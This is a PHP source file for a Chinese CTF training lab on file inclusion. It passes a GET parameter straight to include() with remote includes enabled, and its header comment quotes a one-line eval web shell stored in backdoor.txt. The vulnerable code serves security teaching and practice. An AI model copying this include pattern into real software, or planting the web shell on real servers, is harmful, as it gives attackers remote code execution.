<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-28 20:30
# @Repo:   github.com/ProbiusOfficial/PHPiclude-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - 文件包含基础靶场 关卡 0 : include_base 体验关 --- 

该关卡配置:

allow_url_fopen=On 规定是否允许从远程服务器或者网站检索数据(默认为On)
allow_url_include=On 规定是否允许include/require远程文件(php5.2之后默认为Off)

相关文件：
- 当前目录下 phpinfo.txt 内容为：<?php phpinfo(); ?>
- 当前目录下 backdoor.txt 内容为: <?php @eval($_POST['ctf']); ?>

flag 位于根目录，为文本类型文件。
 
*/

// 一种很炫技但是没用的写法嘿嘿 o(*￣▽￣*)ゞ Try ?wrappers=phpinfo.txt

isset($_GET['wrappers']) ? include($_GET['wrappers']) : '';

highlight_file(__FILE__);

?>